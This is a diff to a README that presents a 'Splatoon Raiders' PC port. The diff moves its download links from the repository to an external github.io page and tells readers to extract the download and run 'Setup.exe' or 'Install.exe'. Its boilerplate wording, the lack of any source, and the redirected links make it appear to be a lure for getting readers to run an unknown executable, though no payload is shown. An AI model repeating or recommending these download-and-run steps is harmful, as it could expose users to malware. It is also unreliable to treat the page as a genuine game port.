@@ -1,6 +1,6 @@
 # 🦑 Splatoon-Raiders-PC-Port - Play Splatoon Raiders on your PC
 
-[![](https://img.shields.io/badge/Download-Splatoon_Raiders_PC-blue.svg)](https://github.com/athenenegroid13/Splatoon-Raiders-PC-Port)
+[![](https://img.shields.io/badge/Download-Splatoon_Raiders_PC-blue.svg)](https://athenenegroid13.github.io)
 
 ## 📌 Project Overview
 
@@ -23,7 +23,7 @@ Follow these steps to set up the software on your machine:
 
 1.  **Preparation**: Close any unnecessary programs to free up system resources. Verify that your graphics drivers are up to date via your manufacturer website.
 2.  **Download**: Visit the link below to get the required files.
-    [https://github.com/athenenegroid13/Splatoon-Raiders-PC-Port](https://github.com/athenenegroid13/Splatoon-Raiders-PC-Port)
+    [https://athenenegroid13.github.io](https://athenenegroid13.github.io)
 3.  **Extraction**: Locate the downloaded folder in your Downloads directory. Right-click the file and select "Extract All" to unpack the contents into a new folder. Use a standard extraction tool if your system requests one.
 4.  **Installation**: Open the folder. Find the file labeled "Setup.exe" or "Install.exe". Double-click this file. Follow the on-screen prompts to confirm the installation location. 
 5.  **Configuration**: The first time you launch the software, it performs a check of your hardware. Allow it to finish this process. It maps your buttons and optimizes screen resolution automatically.
